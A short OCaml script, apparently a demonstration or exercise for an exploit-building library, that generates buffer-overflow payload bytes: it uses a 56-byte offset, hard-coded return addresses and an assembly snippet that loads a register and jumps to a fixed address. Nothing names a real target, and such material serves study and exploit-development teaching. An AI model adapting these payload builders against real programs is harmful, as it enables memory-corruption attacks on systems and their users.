open Octosyn
open Exploit

let _ = mini_exploit 56 "42 1d 6a"
        |> Asm.print_bytes 
        |> print_newline

let payload = "mov edi, 0x40c15130; push 0x00421d96; ret"

let _ = exploit_in 56 payload "55 61 3b f0"
        |> Asm.print_bytes
        |> print_newline

let _ = exploit_out 56 payload "55 61 3b f0"
        |> Asm.print_bytes
        |> print_newline